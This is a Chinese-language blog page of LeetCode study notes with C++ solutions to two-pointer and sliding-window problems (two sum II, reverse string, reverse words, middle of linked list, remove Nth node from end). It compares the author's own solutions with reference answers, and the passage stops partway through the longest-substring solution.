<h3 id="167-两数之和-II-输入有序数组"><a href="#167-两数之和-II-输入有序数组" class="headerlink" title="167. 两数之和 II - 输入有序数组"></a><a href="https://leetcode-cn.com/problems/two-sum-ii-input-array-is-sorted/" target="_blank" rel="noopener">167. 两数之和 II - 输入有序数组</a></h3><blockquote>
<p>二分查找，其中i的下标是第一个元素，mid下标是第二个元素</p>
<p>i从0 ～ size-1</p>
<p>第二个元素从low～high，也就是1～size-1</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; numbers, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;numbers.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> low = i+<span class="number">1</span>,high = numbers.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">while</span>(low &lt;= high)&#123;</span><br><span class="line">                <span class="keyword">int</span> mid = low + (high - low)/<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span>(numbers[mid] == target - numbers[i])&#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;i+<span class="number">1</span>,mid+<span class="number">1</span>&#125;;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(numbers[mid] &gt; target - numbers[i])&#123;</span><br><span class="line">                    high = mid<span class="number">-1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    low = mid+<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>双指针</p>
<blockquote>
<p>从两边依次往里走</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; numbers, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>,high = numbers.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(low &lt; high)&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = numbers[low] + numbers[high];</span><br><span class="line">            <span class="keyword">if</span>(sum == target)&#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;low+<span class="number">1</span>,high+<span class="number">1</span>&#125;;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sum &lt; target)&#123;</span><br><span class="line">                ++low;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                --high;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="第-4-天-双指针"><a href="#第-4-天-双指针" class="headerlink" title="第 4 天 双指针"></a>第 4 天 双指针</h1><h3 id="344-反转字符串"><a href="#344-反转字符串" class="headerlink" title="344. 反转字符串"></a><a href="https://leetcode-cn.com/problems/reverse-string/" target="_blank" rel="noopener">344. 反转字符串</a></h3><p>mine</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverseString</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> times = n / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; times; i++)&#123;</span><br><span class="line">            swap(s[i], s[n-i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>answer</p>
<blockquote>
<p>我写的和答案，本质是一样的，但是思考过程不一样。</p>
<p>我其实没有用到双指针这一思想，而是直接左边过去的思路。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">reverseString</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> left = <span class="number">0</span>,right = n<span class="number">-1</span>;left &lt; right;++left,--right)&#123;</span><br><span class="line">            swap(s[left],s[right]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="557-反转字符串中的单词-III"><a href="#557-反转字符串中的单词-III" class="headerlink" title="557. 反转字符串中的单词 III"></a><a href="https://leetcode-cn.com/problems/reverse-words-in-a-string-iii/" target="_blank" rel="noopener">557. 反转字符串中的单词 III</a></h3><h4 id="split"><a href="#split" class="headerlink" title="split"></a>split</h4><p>C++没有字符串分割函数split，自己实现</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">split</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp; str, <span class="keyword">const</span> <span class="built_in">string</span>&amp; delim)</span> </span>&#123;  </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; res;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="string">""</span> == str) <span class="keyword">return</span> res;  </span><br><span class="line">    <span class="comment">//先将要切割的字符串从string类型转换为char*类型  </span></span><br><span class="line">    <span class="keyword">char</span> * strs = <span class="keyword">new</span> <span class="keyword">char</span>[str.length() + <span class="number">1</span>] ; <span class="comment">//不要忘了  </span></span><br><span class="line">    <span class="built_in">strcpy</span>(strs, str.c_str());   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> * d = <span class="keyword">new</span> <span class="keyword">char</span>[delim.length() + <span class="number">1</span>];  </span><br><span class="line">    <span class="built_in">strcpy</span>(d, delim.c_str());  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *p = strtok(strs, d);  </span><br><span class="line">    <span class="keyword">while</span>(p) &#123;  </span><br><span class="line">        <span class="built_in">string</span> s = p; <span class="comment">//分割得到的字符串转换为string类型  </span></span><br><span class="line">        res.push_back(s); <span class="comment">//存入结果数组  </span></span><br><span class="line">        p = strtok(<span class="literal">NULL</span>, d);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> res;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">split(s,<span class="string">" "</span>);</span><br></pre></td></tr></table></figure>
<p>mine</p>
<blockquote>
<p><img src="/2021/08/26/00-03/image-20210802213123802.png" alt="image-20210802213123802"></p>
<p>虽然效率好像不是很高，不过也算是自己实现的，，，hhh</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">reverseWords</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; v = split(s,<span class="string">" "</span>);</span><br><span class="line">        <span class="built_in">string</span> ans=<span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;v.<span class="built_in">size</span>()<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            ans += reverse(v[i])+<span class="string">" "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ans += reverse(v[v.<span class="built_in">size</span>()<span class="number">-1</span>]);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">reverse</span><span class="params">(<span class="built_in">string</span> s)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>()/<span class="number">2</span>;i++)&#123;</span><br><span class="line">            swap(s[i],s[s.<span class="built_in">size</span>()-i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">split</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp; str, <span class="keyword">const</span> <span class="built_in">string</span>&amp; delim)</span> </span>&#123;  </span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; res;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="string">""</span> == str) <span class="keyword">return</span> res;  </span><br><span class="line">        <span class="comment">//先将要切割的字符串从string类型转换为char*类型  </span></span><br><span class="line">        <span class="keyword">char</span> * strs = <span class="keyword">new</span> <span class="keyword">char</span>[str.length() + <span class="number">1</span>] ; <span class="comment">//不要忘了  </span></span><br><span class="line">        <span class="built_in">strcpy</span>(strs, str.c_str());   </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">char</span> * d = <span class="keyword">new</span> <span class="keyword">char</span>[delim.length() + <span class="number">1</span>];  </span><br><span class="line">        <span class="built_in">strcpy</span>(d, delim.c_str());  </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">char</span> *p = strtok(strs, d);  </span><br><span class="line">        <span class="keyword">while</span>(p) &#123;  </span><br><span class="line">            <span class="built_in">string</span> s = p; <span class="comment">//分割得到的字符串转换为string类型  </span></span><br><span class="line">            res.push_back(s); <span class="comment">//存入结果数组  </span></span><br><span class="line">            p = strtok(<span class="literal">NULL</span>, d);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> res;  </span><br><span class="line">    &#125; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>answer1</p>
<blockquote>
<p>不使用split，巧妙使用while解决</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">reverseWords</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> ret;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; length)&#123;</span><br><span class="line">            <span class="keyword">int</span> start = i;</span><br><span class="line">            <span class="keyword">while</span>(i &lt; length &amp;&amp; s[i] != <span class="string">' '</span>)&#123;<span class="comment">//start是一个单词的开始，i找到该单词的结尾</span></span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> p = start;p&lt;i;p++)&#123;</span><br><span class="line">                ret.push_back(s[start + i - <span class="number">1</span> -p]);<span class="comment">//从该单词结尾往前加到ret字符串上面</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(i &lt; length &amp;&amp; s[i] == <span class="string">' '</span>)&#123;</span><br><span class="line">                i++;<span class="comment">//下一个开始也要跳过空格</span></span><br><span class="line">                ret.push_back(<span class="string">' '</span>);<span class="comment">//加上空格</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>answer2</p>
<blockquote>
<p>相当于我的思路同answer1的结合</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">reverseWords</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; length)&#123;</span><br><span class="line">            <span class="keyword">int</span> start = i;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;length &amp;&amp; s[i] != <span class="string">' '</span>)&#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> left = start,right = i<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">while</span>(left &lt; right)&#123;</span><br><span class="line">                swap(s[left],s[right]);</span><br><span class="line">                left++;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(i &lt; length &amp;&amp; s[i] == <span class="string">' '</span>)&#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="第-5-天-双指针"><a href="#第-5-天-双指针" class="headerlink" title="第 5 天 双指针"></a>第 5 天 双指针</h1><h3 id="876-链表的中间结点"><a href="#876-链表的中间结点" class="headerlink" title="876. 链表的中间结点"></a><a href="https://leetcode-cn.com/problems/middle-of-the-linked-list/" target="_blank" rel="noopener">876. 链表的中间结点</a></h3><blockquote>
<p>wowo，太强了，hhh，第一次100%，自己写的</p>
<p><img src="/2021/08/26/00-03/image-20210802222127027.png" alt="image-20210802222127027"></p>
</blockquote>
<p>mine</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">middleNode</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode* l = head;</span><br><span class="line">        <span class="keyword">int</span> length=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(head-&gt;next!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            length++;</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> times = length / <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;times;i++)&#123;</span><br><span class="line">            l = l-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> l;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>answer1</p>
<blockquote>
<p>将链表放入数组中，取下标中值</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">middleNode</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;ListNode*&gt; A=&#123;head&#125;;</span><br><span class="line">        <span class="keyword">while</span>(A.back()-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            A.push_back(A.back()-&gt;next);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> A[A.<span class="built_in">size</span>()/<span class="number">2</span>];<span class="comment">//因为反着压，所以不用+1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>answer2</p>
<blockquote>
<p>跟我写的一样，称为单指针法</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">middleNode</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">        ListNode* cur = head;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            ++n;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">        cur = head;</span><br><span class="line">        <span class="keyword">while</span>(k&lt;n/<span class="number">2</span>)&#123;</span><br><span class="line">            ++k;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>answer3</p>
<blockquote>
<p>快慢指针，太强了</p>
<p>快指针走到最后，慢指针刚好在中间。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">middleNode</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode* slow = head;</span><br><span class="line">        ListNode* fast = head;</span><br><span class="line">        <span class="keyword">while</span>(fast!= <span class="literal">NULL</span> &amp;&amp; fast-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="19-删除链表的倒数第-N-个结点"><a href="#19-删除链表的倒数第-N-个结点" class="headerlink" title="19. 删除链表的倒数第 N 个结点"></a><a href="https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/" target="_blank" rel="noopener">19. 删除链表的倒数第 N 个结点</a></h3><p>answer1</p>
<blockquote>
<p>按着题目思路一步步解的</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getLength</span><span class="params">(ListNode* head)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(head)&#123;</span><br><span class="line">            ++length;</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">ListNode* <span class="title">removeNthFromEnd</span><span class="params">(ListNode* head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        ListNode* dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>,head);</span><br><span class="line">        <span class="keyword">int</span> length = getLength(head);<span class="comment">//head已经走到尾巴了</span></span><br><span class="line">        ListNode*cur = dummy;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;length-n+<span class="number">1</span>;i++)&#123;<span class="comment">//第一个是多加的0</span></span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur-&gt;next = cur-&gt;next-&gt;next;</span><br><span class="line">        ListNode* ans = dummy-&gt;next;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>answer2</p>
<blockquote>
<p>这种给右边的长度，可以用栈解决</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeNthFromEnd</span><span class="params">(ListNode* head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        ListNode* dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>,head);<span class="comment">//head副本，前面多了一个节点0</span></span><br><span class="line">        <span class="built_in">stack</span>&lt;ListNode*&gt; stk;</span><br><span class="line">        ListNode*cur = dummy;</span><br><span class="line">        <span class="keyword">while</span>(cur)&#123;</span><br><span class="line">            stk.push(cur);</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            stk.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* prev = stk.top();<span class="comment">//取出要删除的前一节点，</span></span><br><span class="line">        prev-&gt;next = prev-&gt;next-&gt;next;<span class="comment">//删除</span></span><br><span class="line">        ListNode* ans = dummy-&gt;next;<span class="comment">//返回删除后的链表（所有操作都是对同一个链表）;</span></span><br><span class="line">        <span class="keyword">delete</span> dummy;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>answer3</p>
<blockquote>
<p>快慢指针，i了i了。</p>
<p>通过两个指针，一个先走，另一个再走，成功把后面的长度转换到了前面。</p>
<p>让second直接找到目标，太强了。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeNthFromEnd</span><span class="params">(ListNode* head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        ListNode* dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>,head);</span><br><span class="line">        ListNode* first = head;</span><br><span class="line">        ListNode* second = dummy;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            first = first-&gt;next;<span class="comment">//first先走那几步</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(first)&#123;<span class="comment">//first走到尾，second刚好到达目标地点</span></span><br><span class="line">            first=first-&gt;next;</span><br><span class="line">            second=second-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        second-&gt;next = second-&gt;next-&gt;next;</span><br><span class="line">        ListNode* ans = dummy-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> dummy;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="第-6-天-滑动窗口"><a href="#第-6-天-滑动窗口" class="headerlink" title="第 6 天 滑动窗口"></a>第 6 天 滑动窗口</h1><h3 id="3-无重复字符的最长子串"><a href="#3-无重复字符的最长子串" class="headerlink" title="3. 无重复字符的最长子串"></a><a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/" target="_blank" rel="noopener">3. 无重复字符的最长子串</a></h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_set</span>&lt;<span class="keyword">char</span>&gt; occ;</span><br><span class="line">        <span class="keyword">int</span> rk=<span class="number">-1</span>,ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span 